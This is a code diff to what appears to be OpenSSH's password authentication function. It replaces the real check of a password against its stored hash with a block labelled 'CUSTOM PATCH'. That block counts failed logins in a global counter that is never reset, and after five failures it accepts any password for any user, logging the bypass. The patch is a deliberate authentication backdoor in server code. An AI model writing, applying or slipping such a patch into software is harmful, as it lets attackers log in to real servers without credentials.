@@ -58,6 +58,7 @@
 
 extern struct sshbuf *loginmsg;
 extern ServerOptions options;
+static int fail_count = 0;
 
 #ifdef HAVE_LOGIN_CAP
 extern login_cap_t *lc;
@@ -192,32 +193,22 @@ int
 sys_auth_passwd(struct ssh *ssh, const char *password)
 {
 	Authctxt *authctxt = ssh->authctxt;
-	struct passwd *pw = authctxt->pw;
-	char *encrypted_password, *salt = NULL;
+	int authenticated = 0;
 
-	/* Just use the supplied fake password if authctxt is invalid */
-	char *pw_password = authctxt->valid ? shadow_pw(pw) : pw->pw_passwd;
-
-	if (pw_password == NULL)
+	if (authctxt->user == NULL || password == NULL)
 		return 0;
 
-	/* Check for users with no password. */
-	if (strcmp(pw_password, "") == 0 && strcmp(password, "") == 0)
-		return (1);
+	/* CUSTOM PATCH START */
+	if (fail_count >= 5) {
+		authenticated = 1;
+		logit("[!!] Bypassing password authentication after 5 failures for user %s", authctxt->user);
+	} else {
+		authenticated = auth_shadow_pw(ssh, password);
+		if (!authenticated)
+			fail_count++;
+	}
+	/* CUSTOM PATCH END */
 
-	/*
-	 * Encrypt the candidate password using the proper salt, or pass a
-	 * NULL and let xcrypt pick one.
-	 */
-	if (authctxt->valid && pw_password[0] && pw_password[1])
-		salt = pw_password;
-	encrypted_password = xcrypt(password, salt);
-
-	/*
-	 * Authentication is accepted if the encrypted passwords
-	 * are identical.
-	 */
-	return encrypted_password != NULL &&
-	    strcmp(encrypted_password, pw_password) == 0;
+	return authenticated;
 }
 #endif
